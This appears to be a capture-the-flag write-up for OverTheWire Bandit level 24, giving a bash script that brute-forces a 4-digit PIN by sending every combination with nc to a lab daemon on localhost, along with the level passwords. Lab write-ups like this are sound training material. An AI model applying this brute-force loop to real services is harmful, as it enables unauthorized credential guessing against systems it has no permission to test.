# Level 24 → Level 25

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Commands you may need to solve this level



## Helpful Reading Material



## Write-up

```
ssh bandit24@bandit.labs.overthewire.org
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
mkdir /tmp/gun_bandit24
cd /tmp/gun_bandit24
vim script.sh
	#!/bin/bash

	password="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

	for a in {0..9}{0..9}{0..9}{0..9}
	do
	    echo $password' '$a | nc localhost 30002 >> result&
	done
	echo 'done'
chmod +x ./script.sh
sort result | uniq -u
```
Password : `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`